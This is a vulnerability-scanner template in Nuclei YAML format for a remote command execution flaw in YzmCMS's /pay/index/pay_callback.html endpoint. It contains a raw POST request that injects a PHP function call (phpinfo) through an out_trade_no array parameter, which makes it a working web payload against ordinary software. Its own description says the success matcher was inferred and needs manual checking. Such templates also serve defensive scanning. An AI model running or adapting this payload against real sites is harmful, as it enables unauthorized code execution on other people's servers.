id: poc-3ae74aa6596dd262bef7
info:
  name: YzmCMS-pay_callback远程命令执行
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
http:
- raw:
  - 'POST /pay/index/pay_callback.html HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Accept-Encoding: gzip

    Content-Type: application/x-www-form-urlencoded


    out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
